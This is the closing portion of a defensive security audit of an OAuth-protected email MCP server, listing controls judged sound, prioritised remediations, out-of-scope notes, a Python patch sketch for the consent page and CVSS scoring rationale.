These are areas I *expected* to find issues in and did not. Calling them out so future reviewers do not re-litigate them.

| Area | Why it's fine |
| --- | --- |
| PKCE | S256 enforced (`validate_authorize_request` line 442-445); verifier compared with `hmac.compare_digest` (line 531). |
| JWT signature verification | `signature_b64` decoded then `hmac.compare_digest` against expected; aud/iss/exp/scope all enforced (`oauth.py` lines 128-165). |
| Refresh tokens | Stored as keyed HMAC-SHA256 (`hash_refresh_token`, line 611); rotated on each use; never returned in plaintext from the store. |
| Mailbox credentials at rest | Fernet-encrypted before persistence (`CredentialVault.encrypt`, line 180-182). Storage row contains only ciphertext. |
| Audit redaction | `SECRET_FIELD_MARKERS` covers PASSWORD/TOKEN/SECRET/KEY/AUTHORIZATION/AUTH_HEADER (`audit.py:13`); `_sanitize` recurses dicts/lists. Even with `MCP_DEBUG_UNREDACTED_LOGS=true`, secret-like fields are redacted. |
| Sender override | Caller-supplied `from_address`, `from_display_name`, `reply_to` are ignored for delivery and audited via `_audit_sender_override` (`tool_controller.py:243-262`). The actual `From` is always the OAuth-captured sender. |
| Email header injection | `EmailMessage.set_content` plus `email.headerregistry.Address` for the display name. CRLF in `subject`/`from_display_name` is rejected by Python's default email policy at serialization time. Recipients are validated by regex that excludes whitespace. |
| Action flags | Every adapter call is gated by `ensure_action_enabled` *before* opening any IMAP/SMTP socket. Defaults in `env.example` are restrictive (destructive ops disabled). |
| TLS validation | `IMAP_TLS_VERIFY=true` enforced (config rejects `false`); SSL contexts use `CERT_REQUIRED` and `check_hostname=True` for both IMAP and SMTP. STARTTLS upgrade path passes the same context. Optional CA bundle path supported for IMAP. |
| Container hardening | Non-root `mcp` user, `read_only: true`, `tmpfs: /tmp`, `cap_drop: ALL`, `no-new-privileges:true`. Compose binds to `127.0.0.1` only by default. |
| CSRF on the consent form | Signed cookie binds the entire `raw_query` SHA-256 plus a fresh per-load token, then validates against a hidden form field — protects against authorize-query swap and ordinary CSRF. |
| Cookie scoping | Cookie path is `/oauth/authorize` only, `HttpOnly`, `SameSite=Lax`, `Secure` when public URL is HTTPS. |
| SQLi | Every store method uses parameterized SQL; no string concatenation of user input into SQL anywhere in the audited code. |
| Body size limits | `MAX_FORM_BODY_BYTES=16_384`, `MAX_JSON_BODY_BYTES=1_048_576`; `Content-Length` is required on every POST. Prevents trivial slowloris/oversize DoS. |
| Sender email validation | `EMAIL_PATTERN` excludes whitespace; recipients also validated; duplicate validation in OAuth form prevents bogus Reply-To records. |

## 6. Recommendations summary

Ordered roughly by ratio of risk reduction to engineering cost.

1. **Fix the consent UI (F-11, F-12)**: render the actual `client_name`, `client_id`, and `redirect_uri` host. Estimated 30 minutes of work, kills the visual side of F-01.
2. **Lock down DCR (F-01)**: add `OAUTH_ALLOWED_REDIRECT_URI_PATTERNS` (regex list) and reject `register_client` if any URI fails the allowlist. ChatGPT's redirect is well-known and stable.
3. **Drop the loopback exemption for production secrets (F-02)**: enforce non-default `OAUTH_SIGNING_KEY` / `OAUTH_COOKIE_SECRET` / `OAUTH_ENCRYPTION_KEY` regardless of scheme. Add an entropy check (≥32 random characters).
4. **Atomic auth-code consumption (F-04)**: switch to `UPDATE … WHERE used = 0` and treat `rowcount == 0` as `invalid_grant`. Revoke session if a code is replayed.
5. **Rate-limit `/oauth/authorize` POST (F-05)**: per-IP and per-`imap_username` token buckets. Single-use CSRF token on the form.
6. **Sanitize subject before audit-file naming (F-06)**: regex allowlist at the OAuth form, plus a defensive substitution in `AuditLogger`.
7. **Set security headers on every response (F-07)**: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, restrictive CSP on the HTML page.
8. **Refresh-token reuse detection (F-10)**: revoke the credential session when a revoked refresh token is re-presented.
9. **Bind tokens to `subject` at verification time (F-03)**: cheap defense in depth.
10. **Either implement or delete the proxy-trust config (F-08)**.

## 7. Out of scope but worth noting (no findings filed)

- The OAuth `state` parameter is not enforced, but the signed CSRF cookie binds the entire `raw_query` (which includes `state`), so the ordinary CSRF/code-injection class is mitigated even when the client omits `state`. RFC compliance is imperfect; security impact is none under the current code.
- Multi-replica deployments share the SQLite store. Concurrent writes are serialized by SQLite's per-database lock, but `OAuthStore` does not use `BEGIN IMMEDIATE`/WAL tuning. If you scale beyond one replica, F-04 becomes much easier to hit and F-10's race becomes meaningful.
- Only one runtime dependency (`cryptography>=42`). I did not enumerate transitive CVEs. Operators should run `pip-audit` / `safety` in CI.
- `_extract_cookie` does not handle quoted cookie values. The only cookie used (`oauth_authorize_csrf`) is a constant-format token, so the simple parser is fine. Callers adding new cookies should use `http.cookies.SimpleCookie` instead.

---

## 8. Appendix A — Suggested patch shape (informational, not exhaustive)

Sketch of the highest-leverage fix (F-01 + F-11 + F-12 combined). Not a complete patch — just to ground the reviewer in what "fix" looks like.

```python
# server.py inside _handle_authorize_get
client = self.server.oauth_service.validate_authorize_request(query)
csrf_token = secrets.token_urlsafe(32)
cookie_value = _sign_authorize_cookie(self.server.config, csrf_token, raw_query)
self._send_html(
    _login_form(
        raw_query=raw_query,
        scopes=self.server.config.oauth.required_scopes,
        csrf_token=csrf_token,
        client_name=client.client_name,             # NEW
        client_id=client.client_id,                 # NEW
        redirect_uri=query["redirect_uri"],         # NEW (already validated)
        is_trusted_client=client.client_id in self.server.config.oauth.trusted_client_ids,  # NEW
        smtp_from_domain=self.server.config.smtp_from_domain,
        debug_unredacted_logs=self.server.config.debug_unredacted_logs,
    ),
    headers={"Set-Cookie": _build_authorize_cookie(self.server.config, cookie_value)},
)
```

…with the form prominently rendering `html.escape(client_name)`, `html.escape(redirect_uri)`, and a red banner when `is_trusted_client` is False.

---

## 9. Appendix B — CVSS rationale notes

- Where I rate `S:C` (scope changed), the security policy of one component is changed by an attack on another. F-01 changes the IMAP/SMTP account's policy via the MCP server. F-05 lets the MCP server force authentication failures against the IMAP backend.
- Where I rate `UI:R`, the attack requires user interaction (click, form submit). I do *not* count operator misconfiguration as `UI:R` — that's `AC:H` (high attack complexity) at most, because the attack doesn't depend on a per-attempt human action.
- I deliberately do not stack worst-case "what if every chained finding is also true" into single-finding scores. Chained scores are reported separately for F-02 to keep the standalone numbers honest.

---

*End of report. Investigator stands by these ratings; happy to defend or revise individual scores in light of additional context (e.g., evidence of any deployment relying on the loopback secret-enforcement exemption, or operational telemetry on DCR-client volume).*
